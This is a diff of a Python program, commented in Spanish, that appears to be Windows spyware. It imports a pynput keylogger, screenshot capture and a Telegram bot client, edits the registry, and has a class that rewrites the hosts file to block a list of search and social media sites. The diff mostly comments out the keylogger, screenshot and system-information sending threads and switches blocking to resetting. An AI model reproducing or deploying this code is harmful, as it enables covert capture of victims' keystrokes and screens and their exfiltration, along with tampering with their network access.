@@ -1,10 +1,12 @@
 # import libs
-import socket
-import ctypes, sys
-from pip._vendor import requests
+#import ctypes, sys
+#from pip._vendor import requests
+import ctypes
+import os
+
 from pynput.keyboard import Listener  # Escucha eventos del teclado
-import os, os.path, platform, ctypes
-# import socket  # Verifica internet
+
+import socket  # Verifica internet
 import threading  # procesos multihilos
 from datetime import datetime  # Devuelve fecha y hora actual
 from winreg import OpenKey, SetValueEx, KEY_ALL_ACCESS, HKEY_CURRENT_USER, REG_SZ  # Modifica registros de Windows
@@ -13,10 +15,8 @@ import random  # Genera numeros
 import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
-import shutil
-from os import remove
+#import shutil
 from PIL import ImageGrab  # Toma capturas de pantalla
-
 
 # region Config
 class Config:
@@ -367,41 +367,32 @@ class WebsiteBlock:
                                  "# localhost name resolution is handled within DNS itself.\n" \
                                  "#	127.0.0.1       localhost\n" \
                                  "#	::1             localhost"
-        self.listWebs = ["www.gogle.com",
-                         "www.wikipedia.com",
-                         "www.bing.com",
-                         "www.es.yahoo.com",
-                         "www.altavista.com",
-                         "www.ask.com",
-                         "www.gigablast.com",
-                         "www.excite.com",
-                         "www.lycos.com",
-                         "www.wolframalpha.com",
-                         "http://zanran.com/q/",
-                         "www.quandl.com",
-                         "www.factbites.com",
-                         "ww.nationmaster.com",
-                         "",
-                         "",
-                         "",
-                         "",
-                         "",
-                         "",
-                         "",
-                         "",
-                         "www.facebook.com",
-                         "www.Instagram.com",
-                         "www.twiter.com",
-                         "www.tiktok.com",
-                         "www.youtube.com",
-                         "www.wechat.com",
-                         "www.linkedln.com",
-                         "www.skype.com",
-                         "www.snapchat.com",
-                         "www.pinterest.com",
-                         "www.whatsapp.com",
-                         "www.reddit.com"]
-
+        self.listWebs =  "www.gogle.com\n"\
+                         "www.wikipedia.com\n"\
+                         "www.bing.com\n"\
+                         "www.es.yahoo.com\n"\
+                         "www.altavista.com\n"\
+                         "www.ask.com\n"\
+                         "www.gigablast.com\n"\
+                         "www.excite.com\n"\
+                         "www.lycos.com\n"\
+                         "www.wolframalpha.com\n"\
+                         "http://zanran.com/q/\n"\
+                         "www.quandl.com\n"\
+                         "www.factbites.com\n"\
+                         "ww.nationmaster.com\n"\
+                         "www.facebook.com\n"\
+                         "www.Instagram.com\n"\
+                         "www.twiter.com\n"\
+                         "www.tiktok.com\n"\
+                         "www.youtube.com\n"\
+                         "www.wechat.com\n"\
+                         "www.linkedln.com\n"\
+                         "www.skype.com\n"\
+                         "www.snapchat.com\n"\
+                         "www.pinterest.com\n"\
+                         "www.whatsapp.com\n"\
+                         "www.reddit.com\n"
         # self.hostsPath = r"test.txt"
 
     def __read_file(self, path):
@@ -412,8 +403,8 @@ class WebsiteBlock:
         file.close()
         return content
 
-    def __write_file(self, path, text, split=True, type="a"):
-        file = open(path, type)
+    def __write_file(self, text, split=True, type="a"):
+        file = open(self.hostsPath, type)
         try:
             for t in text.split("\n"):
                 file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
@@ -422,12 +413,13 @@ class WebsiteBlock:
             # file.write(text)
         file.close()
 
-    def __rewrite_file(self, path, text):
-        self.__write_file(path, text, False, "w")
+    def __rewrite_file(self, text):
+        self.__write_file(text, False, "w")
+        print("Se restauró archivo Hosts File")
 
     def __delete_file(self, path):
         try:
-            remove(path)
+            os.remove(path)
         except:
             pass
 
@@ -442,12 +434,14 @@ class WebsiteBlock:
     """
 
     def block(self):
+        print("Se bloquearon las siguientes paginas webs:")
         # webs = self.__read_file(self.pathListWeb)
         webs = self.listWebs
-        self.__write_file(self.hostsPath, webs)
+        print(webs)
+        self.__write_file(webs)
 
     def unlock(self):
-        self.__rewrite_file(self.hostsPath, self.hostsTextOriginal)
+        self.__rewrite_file(self.hostsTextOriginal)
 
     def reset(self):
         self.unlock()
@@ -538,16 +532,16 @@ class PCInformation:
 if __name__ == '__main__':
     # Verifica permisos de admistrador: Administrador
     print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
-    threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
-    #threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
-    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+    #threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+    threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
+    #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
     #threading.Thread(target=StartUp().infinite).start()
 
-    threading.Thread(target=PCInformation().send).start()
+    #threading.Thread(target=PCInformation().send).start()
 
-    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-    threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
-
+    #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+    #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
+    
     """
     if is_admin():
         # Code of your program here
